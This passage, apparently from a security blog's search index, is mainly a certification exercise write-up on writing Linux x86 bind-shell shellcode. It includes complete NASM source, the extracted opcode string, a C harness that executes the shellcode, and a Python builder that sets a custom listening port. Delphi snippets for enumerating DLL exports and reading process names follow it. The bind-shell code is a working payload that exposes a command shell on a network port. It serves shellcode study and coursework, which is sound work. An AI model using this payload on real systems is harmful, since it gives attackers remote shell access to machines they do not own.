(ebx) we will push the string /bin/sh directly to stack. String slices must be aligned to 4 Bytes. Final string must be NULL terminated.\nFor argv (ecx), the best practice is to provide an address pointing to our shell string (/bin/sh)\nFinally argc (edx) will be set to NULL because unused.\nstack representation for ebx parameter\n   Stack (Low Address)     NULL (4B)   \u0026ldquo;hs//\u0026rdquo; (4B)   \u0026ldquo;nib/\u0026rdquo; (4B)    stack representation for ecx parameter\n   Stack (Low Address)     addr(\u0026quot;/bin/sh\u0026rdquo;)     Our receipe is now finished we can \u0026ldquo;safely\u0026rdquo; enter in the best part as fun as frustrating.\nIf we were expected to create a regular program, we would take care of closing both server and client socket before gracefully exiting our program. When creating shellcode we are not always excepted to do that unless we want to be sure we would not crash the whole vulnerable application.  TCP Bind Assembly Code (NASM) ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; Filename : bindshell.nasm ; ; Author : Jean-Pierre LESUEUR ; ; Website : https://www.phrozen.io/ ; ; Email : jplesueur@phrozen.io ; ; Twitter : @DarkCoderSc ; ; ; ; --------------------------------------------------; ; SLAE32 Certification Exercise N°1 ; ; (Pentester Academy). ; ; https://www.pentesteracademy.com ; ; --------------------------------------------------; ; ; ; Purpose: ; ; --------------------------------------------------; ; Bind Shell ; ; Bind to 0.0.0.0:443 by default ; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; nasm -f elf32 -o bindshell.o bindshell.nasm ; ld -o bindshell bindshell.o ; ./bindshell global _start\tsection .text _start: mov ebp, esp xor eax, eax xor ebx, ebx xor edx, edx xor esi, esi ; will contain our socket handle ;-------------------------------------------------------------------- ; fill 30 lower stack addresses with zero ; sufficient for our payload ;-------------------------------------------------------------------- xor ecx, ecx mov cl, 0x1e _zeromemory: push eax ; push 0x00000000 to stack loop _zeromemory mov esp, ebp ; stack pointer to initial location\t;-------------------------------------------------------------------- ; socket() ;-------------------------------------------------------------------- mov bl, 0x1 ; SYS_SOCKET mov byte [esp-0x8], 0x1 ; SOCK_STREAM mov byte [esp-0xc], 0x2 ; AF_INET sub esp, 0xc mov ecx, esp mov al, 0x66 ; socketcall() syscall number int 0x80 mov esi, eax ; save new socket handle ;-------------------------------------------------------------------- ; setsockopt() ;-------------------------------------------------------------------- xor eax, eax add bl, 0xd ; SYS_SETSOCKOPT mov byte [esp-0x4], 0x4 ; length of socklen_t sub esp, 0x4 mov dword [esp-0x4], esp ; addr of socklen_t mov byte [esp-0x8], 0x2 ; SO_REUSEADDR mov byte [esp-0xc], 0x1 ; SOL_SOCKET mov dword [esp-0x10], esi ; socket handle sub esp, 0x10 mov ecx, esp mov al, 0x66 ; socketcall() syscall number int 0x80 ;-------------------------------------------------------------------- ; bind() ;-------------------------------------------------------------------- xor eax, eax sub bl, 0xc ; SYS_BIND ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; struct sockaddr_in /* Size = 16B */ { ;; ;\tshort sin_family;\t// 2B ;; ;\tunsigned short sin_port;\t// 2B ;; ;\tlong s_addr; // 4B ;; ;\tchar sin_zero[8];\t// 8B ;; ; } ;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; prepare sockaddr_in struct mov al, 0x01 mov ah, 0xbb mov word [esp-0xe], ax ; port = 443 mov byte [esp-0x10], 0x2 ; AF_INET xor eax, eax mov al, 0x10 sub esp, eax mov byte [esp-0x4], 0x10 ; length sockaddr_in (16 Bytes) mov dword [esp-0x8], esp ; addr of sockaddr_in mov dword [esp-0xc], esi ; our socket handle sub esp, 0xc mov ecx, esp xor eax, eax mov al, 0x66 ; socketcall() syscall number int 0x80 ;-------------------------------------------------------------------- ; listen() ;-------------------------------------------------------------------- add bl, 2 ; SYS_LISTEN\tmov dword [esp-0x8], esi ; out socket handle sub esp, 0x8 mov ecx, esp mov al, 0x66 ; socketcall() syscall number int 0x80 ;-------------------------------------------------------------------- ; accept() ;-------------------------------------------------------------------- inc bl ; SYS_ACCEPT mov [esp-0xc], esi ; out socket handle sub esp, 0xc mov ecx, esp mov al, 0x66 ; socketcall() syscall number int 0x80 mov ebx, eax ; assign our new client socket to ebx ;-------------------------------------------------------------------- ; dup2() : Loop from 0 to 2 ; (stdin, stdout, stderr) ;-------------------------------------------------------------------- xor ecx, ecx _dup2:\txor eax, eax\tmov al, 0x3f int 0x80 inc cl cmp cl, 0x2 jle _dup2 ;-------------------------------------------------------------------- ; execve() ;-------------------------------------------------------------------- xor eax, eax xor ebx, ebx xor ecx, ecx ; /bin/sh mov dword [esp-0x8], 0x68732f2f mov dword [esp-0xc], 0x6e69622f sub esp, 0xc mov ebx, esp sub esp, 0x4 mov edx, esp mov dword [esp-0x4], ebx sub esp, 0x4 mov ecx, esp mov al, 0xb ; execve() syscall number int 0x80 Compile and Test our Payload user@local:$ nasm -f elf32 -o bindshell.o bindshell.nasm\nuser@local:$ ld -o bindshell bindshell.o\nRemember, we must be root.  root@local:$ ./bindshell\nFinal Payload (Raw) We will use a famous command from commandlinefu and extract opcodes from our binary.\nuser@local:$ objdump -d ./bindshell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\u0026quot;/'|sed 's/$/\u0026quot;/g'-v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\\t' '\n\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x31\\xc9\\xb1\\x1e\\x50\\xe2 \\xfd\\x89\\xec\\xb3\\x01\\xc6\\x44\\x24\\xf8\\x01\\xc6\\x44\\x24\\xf4\\x02\\x83 \\xec\\x0c\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x80\\xc3\\x0d\\xc6 \\x44\\x24\\xfc\\x04\\x83\\xec\\x04\\x89\\x64\\x24\\xfc\\xc6\\x44\\x24\\xf8\\x02 \\xc6\\x44\\x24\\xf4\\x01\\x89\\x74\\x24\\xf0\\x83\\xec\\x10\\x89\\xe1\\xb0\\x66 \\xcd\\x80\\x31\\xc0\\x80\\xeb\\x0c\\xb0\\x01\\xb4\\xbb\\x66\\x89\\x44\\x24\\xf2 \\xc6\\x44\\x24\\xf0\\x02\\x31\\xc0\\xb0\\x10\\x29\\xc4\\xc6\\x44\\x24\\xfc\\x10 \\x89\\x64\\x24\\xf8\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\x31\\xc0\\xb0 \\x66\\xcd\\x80\\x80\\xc3\\x02\\x89\\x74\\x24\\xf8\\x83\\xec\\x08\\x89\\xe1\\xb0 \\x66\\xcd\\x80\\xfe\\xc3\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\xb0\\x66 \\xcd\\x80\\x89\\xc3\\x31\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\xfe\\xc1\\x80\\xf9 \\x02\\x7e\\xf3\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xc7\\x44\\x24\\xf8\\x2f\\x2f\\x73 \\x68\\xc7\\x44\\x24\\xf4\\x2f\\x62\\x69\\x6e\\x83\\xec\\x0c\\x89\\xe3\\x83\\xec \\x04\\x89\\xe2\\x89\\x5c\\x24\\xfc\\x83\\xec\\x04\\x89\\xe1\\xb0\\x0b\\xcd\\x80 To ensure our shellcode is working when embeeded inside a willingly vulnerable program, we will paste it inside our SLAE32 shellcode.c template file.\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026quot;\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\x31\\xc9\\xb1\\x1e\\x50\\xe2\u0026quot; \u0026quot;\\xfd\\x89\\xec\\xb3\\x01\\xc6\\x44\\x24\\xf8\\x01\\xc6\\x44\\x24\\xf4\\x02\\x83\u0026quot; \u0026quot;\\xec\\x0c\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x80\\xc3\\x0d\\xc6\u0026quot; \u0026quot;\\x44\\x24\\xfc\\x04\\x83\\xec\\x04\\x89\\x64\\x24\\xfc\\xc6\\x44\\x24\\xf8\\x02\u0026quot; \u0026quot;\\xc6\\x44\\x24\\xf4\\x01\\x89\\x74\\x24\\xf0\\x83\\xec\\x10\\x89\\xe1\\xb0\\x66\u0026quot; \u0026quot;\\xcd\\x80\\x31\\xc0\\x80\\xeb\\x0c\\xb0\\x01\\xb4\\xbb\\x66\\x89\\x44\\x24\\xf2\u0026quot; \u0026quot;\\xc6\\x44\\x24\\xf0\\x02\\x31\\xc0\\xb0\\x10\\x29\\xc4\\xc6\\x44\\x24\\xfc\\x10\u0026quot; \u0026quot;\\x89\\x64\\x24\\xf8\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\x31\\xc0\\xb0\u0026quot; \u0026quot;\\x66\\xcd\\x80\\x80\\xc3\\x02\\x89\\x74\\x24\\xf8\\x83\\xec\\x08\\x89\\xe1\\xb0\u0026quot; \u0026quot;\\x66\\xcd\\x80\\xfe\\xc3\\x89\\x74\\x24\\xf4\\x83\\xec\\x0c\\x89\\xe1\\xb0\\x66\u0026quot; \u0026quot;\\xcd\\x80\\x89\\xc3\\x31\\xc9\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\xfe\\xc1\\x80\\xf9\u0026quot; \u0026quot;\\x02\\x7e\\xf3\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xc7\\x44\\x24\\xf8\\x2f\\x2f\\x73\u0026quot; \u0026quot;\\x68\\xc7\\x44\\x24\\xf4\\x2f\\x62\\x69\\x6e\\x83\\xec\\x0c\\x89\\xe3\\x83\\xec\u0026quot; \u0026quot;\\x04\\x89\\xe2\\x89\\x5c\\x24\\xfc\\x83\\xec\\x04\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026quot;; main() { printf(\u0026quot;Shellcode Length: %d\\n\u0026quot;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } user@local:$ gcc shellcode.c -o shellcode -z execstack\nroot@local:$ ./shellcode\nRemember(2), we must be root.  Shellcode Builder (Python3) Last and not mandatory exercise goal is to propose a way easy replace default TCP port number (in our case 443) with any ports from 0 to 65535.\nThis part is quite hard to explain so I wont promise it will be the clearer possible. Forgive me in advance.\nWe need abolutely need to take care of two important things:\nN°1 Port number needs to be converted in Big-Endian as required by documentation related to networking programming then hex encoded.\nOutput port needs to be inserted in reverse order inside our payload.\n N°2 Lets imagine we have port 443 which gives 0xbb01 (converted and encoded), in this case everything is fine but what if we use a port converted and encoded as 0x0080, well it will be padded with a NULL character and it is punished by law to keep a NULL character inside our shellcode.    Solving first point is simple as using the htons() function from socket python library then classically encode output as hexadecimal string.\nSolving the second issue requires more work (I particularly felt trolled by this part).\nFortunately this issue was anticipated in our code and voluntarily left unexplained until now.\nmov al, 0x01 mov ah, 0xbb mov word [esp-0xe], ax ; port = 443 A port number is a word (2 Bytes), to its must be greater or equal to 0x100 to be free of NULL character. Lets imagine if we were doing this way:\nmov eax, 0xbb01 mov dword [esp-0xe], eax This would result having two NULL characters since eax is a 4 bytes register and we are placing only two bytes inside.\nIn this specific case we could easily fix that issue with bellow code:\nmov ax, 0xbb01 mov word [esp-0xe], ax This will work if we are using a port above 0x100 but what if our TCP port is in the lower range. It will result to a NULL character ax is 2 bytes long and we are placing a single byte.\nOne solution is to move the port in two set of instructions.\nFirst we move the first byte to the ah register, then we move the second byte to al register.\nIf we are using a port below 0x100, we will singly remove from our raw shellcode instruction mov al, ... (designated by opcodes \\xb0\\xb01).\nBuilder Code (Python3) This technique is the first techniques that came in my mind, there are literally infinite ways of doing.  #!/usr/bin/python3 ''' Jean-Pierre LESUEUR @DarkCoderSc jplesueur@phrozen.io https://www.phrozen.io *** SLAE32 Certification Exercise N°1 (Pentester Academy). https://www.pentesteracademy.com *** Description: This python script will generate the final payload with desired TCP port number. ''' import socket import sys from textwrap import wrap shellcode = ( \u0026quot;\\\\x89\\\\xe5\\\\x31\\\\xc0\\\\x31\\\\xdb\\\\x31\\\\xd2\\\\x31\\\\xf6\\\\x31\\\\xc9\\\\xb1\\\\x1e\\\\x50\\\\xe2\u0026quot; \u0026quot;\\\\xfd\\\\x89\\\\xec\\\\xb3\\\\x01\\\\xc6\\\\x44\\\\x24\\\\xf8\\\\x01\\\\xc6\\\\x44\\\\x24\\\\xf4\\\\x02\\\\x83\u0026quot; \u0026quot;\\\\xec\\\\x0c\\\\x89\\\\xe1\\\\xb0\\\\x66\\\\xcd\\\\x80\\\\x89\\\\xc6\\\\x31\\\\xc0\\\\x80\\\\xc3\\\\x0d\\\\xc6\u0026quot; \u0026quot;\\\\x44\\\\x24\\\\xfc\\\\x04\\\\x83\\\\xec\\\\x04\\\\x89\\\\x64\\\\x24\\\\xfc\\\\xc6\\\\x44\\\\x24\\\\xf8\\\\x02\u0026quot; \u0026quot;\\\\xc6\\\\x44\\\\x24\\\\xf4\\\\x01\\\\x89\\\\x74\\\\x24\\\\xf0\\\\x83\\\\xec\\\\x10\\\\x89\\\\xe1\\\\xb0\\\\x66\u0026quot; \u0026quot;\\\\xcd\\\\x80\\\\x31\\\\xc0\\\\x80\\\\xeb\\\\x0c\\\\xb0\\\\x01\\\\xb4\\\\xbb\\\\x66\\\\x89\\\\x44\\\\x24\\\\xf2\u0026quot; \u0026quot;\\\\xc6\\\\x44\\\\x24\\\\xf0\\\\x02\\\\x31\\\\xc0\\\\xb0\\\\x10\\\\x29\\\\xc4\\\\xc6\\\\x44\\\\x24\\\\xfc\\\\x10\u0026quot; \u0026quot;\\\\x89\\\\x64\\\\x24\\\\xf8\\\\x89\\\\x74\\\\x24\\\\xf4\\\\x83\\\\xec\\\\x0c\\\\x89\\\\xe1\\\\x31\\\\xc0\\\\xb0\u0026quot; \u0026quot;\\\\x66\\\\xcd\\\\x80\\\\x80\\\\xc3\\\\x02\\\\x89\\\\x74\\\\x24\\\\xf8\\\\x83\\\\xec\\\\x08\\\\x89\\\\xe1\\\\xb0\u0026quot; \u0026quot;\\\\x66\\\\xcd\\\\x80\\\\xfe\\\\xc3\\\\x89\\\\x74\\\\x24\\\\xf4\\\\x83\\\\xec\\\\x0c\\\\x89\\\\xe1\\\\xb0\\\\x66\u0026quot; \u0026quot;\\\\xcd\\\\x80\\\\x89\\\\xc3\\\\x31\\\\xc9\\\\x31\\\\xc0\\\\xb0\\\\x3f\\\\xcd\\\\x80\\\\xfe\\\\xc1\\\\x80\\\\xf9\u0026quot; \u0026quot;\\\\x02\\\\x7e\\\\xf3\\\\x31\\\\xc0\\\\x31\\\\xdb\\\\x31\\\\xc9\\\\xc7\\\\x44\\\\x24\\\\xf8\\\\x2f\\\\x2f\\\\x73\u0026quot; \u0026quot;\\\\x68\\\\xc7\\\\x44\\\\x24\\\\xf4\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x83\\\\xec\\\\x0c\\\\x89\\\\xe3\\\\x83\\\\xec\u0026quot; \u0026quot;\\\\x04\\\\x89\\\\xe2\\\\x89\\\\x5c\\\\x24\\\\xfc\\\\x83\\\\xec\\\\x04\\\\x89\\\\xe1\\\\xb0\\\\x0b\\\\xcd\\\\x80\u0026quot; ) if len(sys.argv) != 2: print(\u0026quot;Usage: ./gen_bindshell.py \u0026lt;port_number\u0026gt;\u0026quot;) else: tcp_port = int(sys.argv[1]) if (tcp_port \u0026gt; 65535) or (tcp_port \u0026lt; 0): print(\u0026quot;Invalid port number (0..65535)\u0026quot;) else: # # Format port # raw_port = ('{:04x}'.format(socket.htons(tcp_port)))\traw_port_1 = \u0026quot;\\\\x{}\u0026quot;.format(raw_port[2:4]) raw_port_2 = \u0026quot;\\\\x{}\u0026quot;.format(raw_port[:2])\t# # Modify existing shellcode (hundred of possibilities)\t# if raw_port_1 == \u0026quot;\\\\x00\u0026quot;: shellcode = shellcode.replace(\u0026quot;\\\\xb0\\\\x01\u0026quot;, \u0026quot;\u0026quot;) else: shellcode = shellcode.replace(\u0026quot;\\\\xb0\\\\x01\u0026quot;, \u0026quot;\\\\xb0{}\u0026quot;.format(raw_port_1)) shellcode = shellcode.replace(\u0026quot;\\\\xb4\\\\xbb\u0026quot;, \u0026quot;\\\\xb4{}\u0026quot;.format(raw_port_2)) #shellcode = shellcode.replace(\u0026quot;\\\\x01\\\\xbb\u0026quot;, patch) final_payload = \u0026quot;// Shellcode size = {}\\n\u0026quot;.format(int(len(shellcode) / 4)) final_payload += \u0026quot;unsigned char code[] = \\\\\\n\u0026quot; for l in wrap(shellcode, 64): final_payload += \u0026quot;\\t\\\u0026quot;{}\\\u0026quot;\\n\u0026quot;.format(l) final_payload = final_payload[:-1] + \u0026quot;;\u0026quot; print(final_payload) Usage user@local:$ python3 ./gen_bindshell.py 1403\nor\nuser@local:$ chmod +x gen_bindshell.py \u0026amp;\u0026amp; ./gen_bindshell.py 1403\nReplace output content to SLAE32 C shellcode.c template and see what happens when varying port number.\nConclusion Creating a TCP bindshell shellcode is straightforward but not an easy task.\nIt requires a solid comprehension of shellcoding and assembly throughout all steps. On the 7th exercises for passing the SLAE32 certification this is probably the most exausting part both for solving the challenge and explaning through this paper.\nTCP Bindshells are not always the best choice because of privilege lacking / port filtering etc.. Using reverse shell is often a more effective and realistic technique and coincidentally it is the subject of next exercise 😊\n"});index.add({'id':17,'href':'/docs/linux/','title':"Linux",'content':""});index.add({'id':18,'href':'/docs/windows/projects/opensource/','title':"Open Source",'content':"Open Source Projects Sections   DLL Export Enum v1.0 Update PEB Debug Flag (Delphi) EOF Reader (C++)  "});index.add({'id':19,'href':'/docs/linux/slae32/','title':"SLAE32",'content':"SLAE32 Certification Sections  This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.\nIf you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.\nWhy? the goal of that certification is to practice and learn how to solve each exercise by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.\n  Exercise N°1 - Bindshell (NASM)  "});index.add({'id':20,'href':'/docs/windows/snippets/delphi/enum-dll-exported-functions/','title':"Enum DLL Exported Functions",'content':"This unit demonstrate how to enumerate DLL exported functions through PE Header manipulation.\nFeatures  Support both 32 and 64bit DLL\u0026rsquo;s. Identify exported function names. Identify exported function ordinal value. Support and resolve forwarded function. Identify export function address and relative address.  Unit Code (******************************************************************************* Author: -\u0026gt; Jean-Pierre LESUEUR (@DarkCoderSc) https://github.com/DarkCoderSc https://gist.github.com/DarkCoderSc https://www.phrozen.io/ License: -\u0026gt; MIT *******************************************************************************) unit UntEnumDLLExport; interface uses Classes, Windows, Generics.Collections, SysUtils; type TExportEntry = class private FName : String; FForwarded : Boolean; FForwardName : String; FRelativeAddr : Cardinal; FAddress : Int64; FOrdinal : Word; {@M} function GetFormatedAddress() : String; function GetFormatedRelativeAddr() : String; public {@C} constructor Create(); {@G/S} property Name : String read FName write FName; property Forwarded : Boolean read FForwarded write FForwarded; property ForwardName : String read FForwardName write FForwardName; property Address : Int64 read FAddress write FAddress; property RelativeAddr : Cardinal read FRelativeAddr write FRelativeAddr; property Ordinal : Word read FOrdinal write FOrdinal; {@G} property FormatedAddress : String read GetFormatedAddress; property FormatedRelativeAddress : String read GetFormatedRelativeAddr; end; TEnumDLLExport = class private FItems : TObjectList\u0026lt;TExportEntry\u0026gt;; FFileName : String; {@M} public {@C} constructor Create(AFileName : String); destructor Destroy(); override; {@M} function Enum() : Integer; {@G} property Items : TObjectList\u0026lt;TExportEntry\u0026gt; read FItems; property FileName : String read FFileName; end; implementation {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ Local Functions +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} function IntToHexF(AValue : Int64; APad : Word = 0 {0=Auto}) : String; begin if (APad = 0) then begin if (AValue \u0026lt;= High(Word)) then APad := 2 else if (AValue \u0026lt;= High(DWORD)) and (AValue \u0026gt; High(Word)) then APad := 8 else if (AValue \u0026lt;= High(Int64)) and (AValue \u0026gt; High(DWORD)) then APad := 16; end; result := '0x' + IntToHex(AValue, APad); end; {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ TExportEntry +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} constructor TExportEntry.Create(); begin FName := ''; FForwarded := False; FForwardName := ''; FAddress := 0; FRelativeAddr := 0; FOrdinal := 0; end; function TExportEntry.GetFormatedAddress() : String; begin result := IntToHexF(FAddress {AUTO}); end; function TExportEntry.GetFormatedRelativeAddr() : String; begin result := IntToHexF(FRelativeAddr, (SizeOf(FRelativeAddr) * 2)); end; {+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ TEnumPEExport +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++} constructor TEnumDLLExport.Create(AFileName : String); begin FItems := TObjectList\u0026lt;TExportEntry\u0026gt;.Create(True); FFileName := AFileName; end; destructor TEnumDLLExport.Destroy(); begin if Assigned(FItems) then FreeAndNil(FItems); /// inherited Destroy(); end; { ERROR_CODES: ------------------------------------------------------------------------------ -99 : Unknown. -1 : Could not open file. -2 : Could not read image dos header. -3 : Invalid or corrupted PE File. -4 : Could not read nt header signature. -5 : Could not read image file header. -6 : Could not read optional header. -7 : Could not retrieve entry export address. -8 : Could not read export directory. -9 : No exported functions. } function TEnumDLLExport.Enum() : Integer; var hFile : THandle; dwBytesRead : Cardinal; AImageDosHeader : TImageDosHeader; AImageNtHeaderSignature : DWORD; x64Binary : Boolean; AImageFileHeader : TImageFileHeader; AImageOptionalHeader32 : TImageOptionalHeader32; AImageOptionalHeader64 : TImageOptionalHeader64; AExportAddr : TImageDataDirectory; AExportDir : TImageExportDirectory; I : Integer; ACanCatchSection : Boolean; AOffset : Cardinal; AExportName : AnsiString; ALen : Cardinal; AOrdinal : Word; AFuncAddress : Cardinal; AImageBase : UInt64; AExportEntry : TExportEntry; AForwarded : Boolean; AForwardName : AnsiString; AImportVirtualAddress : Cardinal; function RVAToFileOffset(ARVA : Cardinal) : Cardinal; var I : Integer; AImageSectionHeader : TImageSectionHeader; ASectionsOffset : Cardinal; begin result := 0; /// if (ARVA = 0) or (NOT ACanCatchSection) then Exit(); /// ASectionsOffset := ( AImageDosHeader._lfanew + SizeOf(DWORD) + SizeOf(TImageFileHeader) + AImageFileHeader.SizeOfOptionalHeader ); for I := 0 to (AImageFileHeader.NumberOfSections -1) do begin SetFilePointer(hFile, ASectionsOffset + (I * SizeOf(TImageSectionHeader)), nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageSectionHeader, SizeOf(TImageSectionHeader), dwBytesRead, 0) then continue; if (ARVA \u0026gt;= AImageSectionHeader.VirtualAddress) and (ARVA \u0026lt; AImageSectionHeader.VirtualAddress + AImageSectionHeader.SizeOfRawData) then result := (ARVA - AImageSectionHeader.VirtualAddress + AImageSectionHeader.PointerToRawData); end; end; { Read file from a starting offset to a null character. } function GetStringLength(AStartAtPos : Cardinal) : Cardinal; var ADummy : Byte; begin result := 0; /// if (hFile = INVALID_HANDLE_VALUE) then Exit(); SetFilePointer(hFile, AStartAtPos, nil, FILE_BEGIN); while True do begin if NOT ReadFile(hFile, ADummy, SizeOf(Byte), dwBytesRead, nil) then break; /// if (ADummy = 0) then break; Inc(result); end; end; begin result := -99; // Failed /// if NOT Assigned(FItems) then Exit(); FItems.Clear(); ACanCatchSection := False; { Read PE Header to reach Export List } hFile := CreateFileW(PWideChar(FFileName), GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0); if hFile = INVALID_HANDLE_VALUE then Exit(-1); /// try if NOT ReadFile(hFile, AImageDosHeader, SizeOf(TImageDosHeader), dwBytesRead, 0) then Exit(-2); /// if (AImageDosHeader.e_magic \u0026lt;\u0026gt; IMAGE_DOS_SIGNATURE) then Exit(-3); // Not a valid PE File /// SetFilePointer(hFile, AImageDosHeader._lfanew, nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageNtHeaderSignature, SizeOf(DWORD), dwBytesRead, 0) then Exit(-4); /// if (AImageNTHeaderSignature \u0026lt;\u0026gt; IMAGE_NT_SIGNATURE) then Exit(-3); /// SetFilePointer(hFile, (AImageDosHeader._lfanew + sizeOf(DWORD)), nil, FILE_BEGIN); if NOT ReadFile(hFile, AImageFileHeader, SizeOf(TImageFileHeader), dwBytesRead, 0) then Exit(-5); /// ACanCatchSection := True; x64Binary := (AImageFileHeader.Machine = IMAGE_FILE_MACHINE_AMD64); if x64Binary then begin if NOT ReadFile(hFile, AImageOptionalHeader64, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead, 0) then Exit(-6); end else begin if NOT ReadFile(hFile, AImageOptionalHeader32, AImageFileHeader.SizeOfOptionalHeader, dwBytesRead, 0) then Exit(-6); end; /// AExportAddr.VirtualAddress := 0; AExportAddr.Size := 0; if x64Binary then begin AExportAddr := AImageOptionalHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; AImageBase := AImageOptionalHeader64.ImageBase; AImportVirtualAddress := AImageOptionalHeader64.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; end else begin AExportAddr := AImageOptionalHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; AImageBase := AImageOptionalHeader32.ImageBase; AImportVirtualAddress := AImageOptionalHeader32.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; end; AOffset := RVAToFileOffset(AExportAddr.VirtualAddress); if AOffset = 0 then Exit(-7); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AExportDir, SizeOf(TImageExportDirectory), dwBytesRead, 0) then Exit(-8); /// if (AExportDir.NumberOfFunctions \u0026lt;= 0) then Exit(-9); /// { Enumerate Named Exported Functions } for I := 0 to AExportDir.NumberOfNames - 1 do begin { Get Exported Ordinal } AOffset := RVAToFileOffset(AExportDir.AddressOfNameOrdinals) + (I * SizeOf(Word)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AOrdinal, SizeOf(Word), dwBytesRead, 0) then continue; // Ignore this entry /// { Get Exported Function Address } AOffset := RVAToFileOffset(AExportDir.AddressOfFunctions) + (AOrdinal * SizeOf(Cardinal)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AFuncAddress, SizeOf(Cardinal), dwBytesRead, 0) then continue; // Ignore this entry { Get Exported Function Name } AOffset := RVAToFileOffset(AExportDir.AddressOfNames) + (I * SizeOf(Cardinal)); SetFilePointer(hFile, AOffset, nil, FILE_BEGIN); if NOT ReadFile(hFile, AOffset, SizeOf(Cardinal), dwBytesRead, 0) then continue; // Ignore this entry /// ALen := GetStringLength(RVAToFileOffset(AOffset)); SetLength(AExportName, ALen); SetFilePointer(hFile, RVAToFileOffset(AOffset), nil, FILE_BEGIN); if NOT ReadFile(hFile, AExportName[1], ALen, dwBytesRead, nil) then continue; // Ignore this entry { Is Function Forwarded ? If yes, we catch its name } AForwarded := (AFuncAddress \u0026gt; RVAToFileOffset(AExportAddr.VirtualAddress)) and (AFuncAddress \u0026lt;= AImportVirtualAddress); if AForwarded then begin ALen := GetStringLength(RVAToFileOffset(AFuncAddress)); SetFilePointer(hFile, RVAToFileOffset(AFuncAddress), nil, FILE_BEGIN); SetLength(AForwardName, ALen); if NOT ReadFile(hFile, AForwardName[1], ALen, dwBytesRead, nil) then continue; // Ignore this entry end; { Create and append a new export entry } AExportEntry := TExportEntry.Create(); AExportEntry.Name := AExportName; AExportEntry.Ordinal := (AOrdinal + AExportDir.Base); AExportEntry.RelativeAddr := AFuncAddress; AExportEntry.Address := (AImageBase + AFuncAddress); AExportEntry.Forwarded := AForwarded; AExportEntry.ForwardName := AForwardName; FItems.Add(AExportEntry); end; /// result := FItems.Count; finally CloseHandle(hFile); end; end; end. "});index.add({'id':21,'href':'/docs/windows/snippets/delphi/get-process-name-method-1/','title':"Get Process Name Method 1",'content':"This one possible technique (through QueryFullProcessImageNameW) to get process image path from it id.\nThis example support Windows Vista to latest Windows version (Actually Windows 10)\nI will cover other example progressively and compatible with Windows XP and below.\n// Jean-Pierre LESUEUR (@DarkCoderSc) //... uses Windows, SysUtils; //... function GetProcessName(AProcessID : Cardinal) : String; var hProc : THandle; ALength : DWORD; hDLL : THandle; QueryFullProcessImageNameW : function( AProcess: THANDLE; AFlags: DWORD; AFileName: PWideChar; var ASize: DWORD): BOOL; stdcall; const PROCESS_QUERY_LIMITED_INFORMATION = $00001000; begin result := ''; /// if (TOSVersion.Major \u0026lt; 6) then Exit(); /// QueryFullProcessImageNameW := nil; hDLL := LoadLibrary('kernel32.dll'); if hDLL = 0 then Exit(); try @QueryFullProcessImageNameW := GetProcAddress(hDLL, 'QueryFullProcessImageNameW'); /// if Assigned(QueryFullProcessImageNameW) then begin hProc := OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, AProcessID); if hProc = 0 then exit; try ALength := (MAX_PATH * 2); SetLength(result, ALength); if NOT QueryFullProcessImageNameW(hProc, 0, @result[1], ALength) then Exit(); SetLength(result, ALength); // Get rid of extra junk finally CloseHandle(hProc); end; end; finally FreeLibrary(hDLL); end; end; "});index.add({'id':22,'href':'/docs/windows/snippets/delphi/enum-modules-method-1/','title':"Enum Modules Method 1",'content':"You will find below an example of how to enumerate process modules using the well known Windows 